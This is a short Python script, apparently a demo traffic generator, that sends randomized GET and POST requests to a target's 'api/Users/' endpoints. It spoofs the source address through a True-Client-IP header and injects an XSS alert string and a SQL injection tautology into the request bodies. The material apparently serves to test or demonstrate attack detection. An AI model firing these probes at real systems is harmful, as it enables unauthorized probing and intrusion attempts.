import requests, random

# an example attack
def api_catalog_demo(target, source_ip, user_agent, **kwargs):

    # the URIs we're going to request
    uris = [ 'api/Users/', 'api/Users/%' ]

    # True-Client-IP needs to be set in order to spoof source ip.
    headers = {'User-Agent': user_agent, 'True-Client-IP': str(source_ip), 'Content-Type': 'application/json; charset=utf-8'}
   
    payloads = [
                '<script>alert(1)</script>',
                '\' OR 1=1\'-- ',
                'world'
            ]

    methods = [ 'POST', 'GET']

    count=random.randint(1,3)
    ret=''

    for i in range(count):

        payload = random.choices(payloads, weights=(30,30,70), k=3)[0]
        method = random.choice(methods)
        uri = random.choices(uris, weights=(75,25), k=2)[0]

        if method == 'POST':
            
            req = {
                    'method': method,
                    'url': '{}/{}'.format(target,uri),
                    'payload': { 'hello': payload }
                    }

            response = requests.request(req['method'], req['url'], headers=headers, json=req['payload'])
            print("Status: %s; Method: %s; Payload: %s; Headers: %s" % (response.status_code, method, payload, response.headers))
            ret += 'api_catalog_demo: got {} with {}\n'.format(response.status_code,req['url'])
        
        else:

            req = {
                    'method': method,
                    'url': '{}/{}'.format(target,uri)
                    }

            response = requests.request(req['method'], req['url'], headers=headers)
            print("Status: %s; Method: %s; Payload: %s; Headers: %s" % (response.status_code, method, payload, response.headers))
            ret += 'api_catalog_demo: got {} with {}\n'.format(response.status_code,req['url'])
    
    return(ret)
